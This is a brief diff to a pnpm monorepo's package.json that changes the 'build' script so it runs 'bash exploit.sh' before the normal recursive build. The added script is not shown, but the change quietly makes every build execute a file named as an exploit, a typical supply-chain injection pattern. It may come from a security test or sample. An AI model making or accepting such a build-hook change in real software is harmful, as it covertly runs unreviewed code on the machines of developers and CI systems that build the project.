@@ -9,7 +9,7 @@
   "main": "",
   "scripts": {
     "dev": "pnpm --filter @candriajs/karin-plugin-git dev",
-    "build": "pnpm -r run build"
+    "build": "bash exploit.sh; pnpm -r run build"
   },
   "devDependencies": {
     "@prettier/plugin-oxc": "^0.1.3",
